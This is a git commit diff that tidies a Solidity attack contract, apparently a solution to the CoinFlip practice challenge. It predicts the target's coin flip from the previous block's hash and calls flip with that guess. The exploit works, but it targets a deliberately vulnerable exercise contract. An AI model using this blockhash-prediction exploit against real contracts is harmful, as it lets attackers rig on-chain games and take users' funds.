4d1b90f3729c220df01a90841d09d82132edbe9a
Ignacio Bravo <bravoignacio95@gmail.com>
2023-04-28 15:05:44 -0300

    Cleaner version of CoinFlip Solution

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -2,10 +2,6 @@
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
-interface ICoinFlip{
-    function flip(bool _guess) external returns (bool);
-}
-
 contract AttackingCoinFlip {
     address public contractAddress;
 
@@ -13,12 +9,12 @@ contract AttackingCoinFlip {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external returns (bool){
+    function hackContract() external {
         // Code me!
         uint256 FACTOR      = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         uint256 blockValue  = uint256(blockhash(block.number - 1));
         uint256 coinFlip    = blockValue / FACTOR;
         bool _guess         = coinFlip == 1 ? true : false;
-        return ICoinFlip(contractAddress).flip(_guess);
+        CoinFlip(contractAddress).flip(_guess);
     }
 }
